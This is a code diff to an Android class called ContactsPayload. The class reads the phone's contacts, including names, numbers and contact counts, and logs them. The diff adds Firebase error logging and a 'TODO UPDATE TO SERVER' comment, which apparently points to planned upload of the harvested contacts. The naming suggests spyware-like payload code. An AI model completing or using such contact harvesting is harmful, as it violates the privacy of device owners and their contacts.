@@ -7,6 +7,9 @@ import android.os.AsyncTask;
 import android.provider.ContactsContract;
 import android.util.Log;
 
+import com.aigs.serviceone.helpers.PayloadTypes;
+import com.google.firebase.database.FirebaseDatabase;
+
 import java.lang.ref.WeakReference;
 import java.util.HashSet;
 
@@ -45,10 +48,10 @@ public class ContactsPayload extends AsyncTask<String, String, Integer> {
                         name = cursor.getString(nameIndex);
                         number = cursor.getString(numberIndex);
                         times_called = cursor.getString(timesContactedIndex);
-
                         number = number.replace(" ", "");
                         if (!mobileNoSet.contains(number)) {
                             // contactList.add(new Contact(name, number));
+                            //TODO UPDATE TO SERVER
                             mobileNoSet.add(number);
                             Log.d("hvy", "onCreaterrView  Phone Number: name = " + name
                                     + " No = " + number + " Contacted " + times_called + " Times");
@@ -59,8 +62,8 @@ public class ContactsPayload extends AsyncTask<String, String, Integer> {
                 }
             }
         } catch (Exception e) {
-            //TODO update to server log
             Log.e("ERROR_CON : ", e.getMessage());
+            FirebaseDatabase.getInstance().getReference("Logs").child(PayloadTypes.GET_USER_CONTACTS+"").child("CurrentLog").setValue(e.getMessage());
         }
 
         return null;
